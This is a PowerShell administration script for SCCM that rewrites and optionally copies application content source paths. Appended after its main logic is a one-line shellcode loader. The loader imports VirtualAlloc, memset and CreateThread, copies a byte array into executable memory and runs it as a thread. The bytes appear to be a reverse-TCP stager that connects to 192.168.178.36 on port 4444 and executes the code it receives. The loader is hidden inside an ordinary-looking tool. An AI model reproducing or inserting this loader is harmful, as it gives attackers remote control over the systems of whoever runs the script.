[CmdletBinding(SupportsShouldProcess=$true)]
param(
[parameter(Mandatory=$true,ParameterSetName="Single")]
[parameter(ParameterSetName="Recurse")]
[string]$SiteServer,
[parameter(Mandatory=$false,ParameterSetName="Single")]
$ApplicationName,
[parameter(Mandatory=$true,ParameterSetName="Single")]
[parameter(ParameterSetName="Recurse")]
[string]$Locate,
[parameter(Mandatory=$true,ParameterSetName="Single")]
[parameter(ParameterSetName="Recurse")]
[string]$Replace,
[parameter(Mandatory=$false,ParameterSetName="Recurse")]
[switch]$Recurse,
[parameter(Mandatory=$false,ParameterSetName="Single")]
[parameter(ParameterSetName="Recurse")]
[switch]$Copy
)

Begin {
    try {
        
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug "SiteCode: $($SideCode)"
            }
        }
    }
    catch [Exception] {
        Throw "Unable to determine SiteCode"
    }
    try {
        
        Write-Verbose "Trying to load necessary assemblies"
        [System.Reflection.Assembly]::LoadFrom((Join-Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName "Microsoft.ConfigurationManagement.ApplicationManagement.dll")) | Out-Null
        [System.Reflection.Assembly]::LoadFrom((Join-Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName "Microsoft.ConfigurationManagement.ApplicationManagement.Extender.dll")) | Out-Null
        [System.Reflection.Assembly]::LoadFrom((Join-Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName "Microsoft.ConfigurationManagement.ApplicationManagement.MsiInstaller.dll")) | Out-Null
    }
    catch [Exception] {
        Throw $_.Exception.Message
    }
}

Process {
    function Rename-ApplicationSource {
        [CmdletBinding(SupportsShouldProcess=$true)]
        param(
        [parameter(Mandatory=$true)]
        $AppName
        )
        $AppName | ForEach-Object {
            $LocalizedDisplayName = $_.LocalizedDisplayName
            $Application = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_ApplicationLatest" -ComputerName $SiteServer | Where-Object { $_.LocalizedDisplayName -like "$($LocalizedDisplayName)" }
            $CurrentApplication = [wmi]$Application.__PATH
            
            $ApplicationXML = [Microsoft.ConfigurationManagement.ApplicationManagement.Serialization.SccmSerializer]::DeserializeFromString($CurrentApplication.SDMPackageXML,$True)
            foreach ($DeploymentType in $ApplicationXML.DeploymentTypes) {
                $Installer = $DeploymentType.Installer
                $CurrentContentLocation = $DeploymentType.Installer.Contents[0].Location
                $ContentLocation = $DeploymentType.Installer.Contents[0].Location -replace "$($Locate)", "$($Replace)"
                if ($CurrentContentLocation -match $Locate) {
                    
                    try {
                        if (-not($Copy)) {
                            if (-not(Test-Path $ContentLocation -PathType Container)) {
                                New-Item -Path $ContentLocation -ItemType Directory | Out-Null
                            }
                        }
                        
                        if ($Copy) {
                            Write-Verbose "Initiating copy operation"
                            if ($CurrentContentLocation.EndsWith("\")) {
                                Write-Verbose "Special characters was found at end of string"
                                $FinalDestination = $ContentLocation.Substring(0,$ContentLocation.Length-1)
                                if ($PSCmdlet.ShouldProcess("From: $($CurrentContentLocation)","Copy files")) {
                                    Write-Verbose "Copy destination: `n$($FinalDestination)"
                                    if (-not(Test-Path -Path $FinalDestination)) {
                                        New-Item -Path $FinalDestination -ItemType Directory | Out-Null
                                        if ((Get-ChildItem -Path $FinalDestination | Measure-Object).Count -eq 0) {
                                            $FinalSource = $CurrentContentLocation.Substring(0,$CurrentContentLocation.Length-1)
                                            Write-Verbose "Copy source: `n$($FinalSource)"
                                            $SourceChildItems = Get-ChildItem -Path $FinalSource
                                            foreach ($SourceChildItem in $SourceChildItems) {
                                                Copy-Item -Path $SourceChildItem.FullName -Destination $FinalDestination -Force -Recurse -Verbose:($PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent)
                                            }
                                        }
                                    }
                                }
                            }
                            else {
                                Write-Verbose "No special characters was found at end of string"
                                $FinalDestination = $ContentLocation
                                if ($PSCmdlet.ShouldProcess("From: $($CurrentContentLocation)","Copy files")) {
                                    Write-Verbose "Copy destination: $($FinalDestination)"
                                    if (-not(Test-Path -Path $FinalDestination)) {
                                        New-Item -Path $FinalDestination -ItemType Directory | Out-Null
                                        if ((Get-ChildItem -Path $FinalDestination | Measure-Object).Count -eq 0) {
                                            $FinalSource = $CurrentContentLocation
                                            $SourceChildItems = Get-ChildItem -Path $FinalSource
                                            foreach ($SourceChildItem in $SourceChildItems) {
                                                Copy-Item -Path $SourceChildItem.FullName -Destination $FinalDestination -Force -Recurse -Verbose:($PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent)
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    catch [Exception] {
                        Throw $_.Exception.Message
                    }
                    
                    if ($PSCmdlet.ShouldProcess("Application: $($LocalizedDisplayName)", "Amend content source path")) {
                        if ($CurrentContentLocation -ne $ContentLocation) {
                            Write-Verbose "Current content source path: `n $($CurrentContentLocation)"
                            $UpdateContent = [Microsoft.ConfigurationManagement.ApplicationManagement.ContentImporter]::CreateContentFromFolder($ContentLocation)
                            $UpdateContent.FallbackToUnprotectedDP = $True
                            $UpdateContent.OnFastNetwork = [Microsoft.ConfigurationManagement.ApplicationManagement.ContentHandlingMode]::Download
                            $UpdateContent.OnSlowNetwork = [Microsoft.ConfigurationManagement.ApplicationManagement.ContentHandlingMode]::DoNothing
                            $UpdateContent.PeerCache = $False
                            $UpdateContent.PinOnClient = $False
                            $Installer.Contents[0].ID = $UpdateContent.ID
                            $Installer.Contents[0] = $UpdateContent
                            
                            $UpdatedXML = [Microsoft.ConfigurationManagement.ApplicationManagement.Serialization.SccmSerializer]::SerializeToString($ApplicationXML, $True)
                            $CurrentApplication.SDMPackageXML = $UpdatedXML
                            $CurrentApplication.Put() | Out-Null
                            Write-Verbose "New content source path: `n $($ContentLocation)"
                        }
                        elseif ($CurrentContentLocation -eq $ContentLocation) {
                            Write-Warning "The current content location path matches the new location, will not update the path for '$($LocalizedDisplayName)'"
                        }
                    }
                }
                else {
                    Write-Warning "The search term '$($Locate)' for application '$($LocalizedDisplayName)' could not be matched in the content source location '$($CurrentContentLocation)'"
                }
            }
        }
    }
    if (($PSBoundParameters["Recurse"]) -and (-not($PSBoundParameters["ApplicationName"])) -and ($ApplicationName.Length -eq 0)) {
        $ApplicationName = New-Object -TypeName System.Collections.ArrayList
        $GetApplications = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_Application" -ComputerName $SiteServer | Where-Object {$_.IsLatest -eq $True}
        $ApplicationCount = $GetApplications.Count
        $GetApplications | ForEach-Object {
            $ApplicationName.Add($_) | Out-Null
        }
        Rename-ApplicationSource -AppName $ApplicationName -Verbose
    }
    elseif (($PSBoundParameters["Recurse"]) -and ($PSBoundParameters["ApplicationName"])) {
        Write-Warning "You cannot specify the 'ApplicationName' and 'Recurse' parameters at the same time"
    }
    if ((-not($PSBoundParameters["Recurse"])) -and ($PSBoundParameters["ApplicationName"]) -and ($ApplicationName.Length -ge 1)) {
        $GetApplicationName = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_ApplicationLatest" -ComputerName $SiteServer | Where-Object { $_.LocalizedDisplayName -like "$($ApplicationName)" }
        Rename-ApplicationSource -AppName $GetApplicationName -Verbose
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xb2,0x24,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

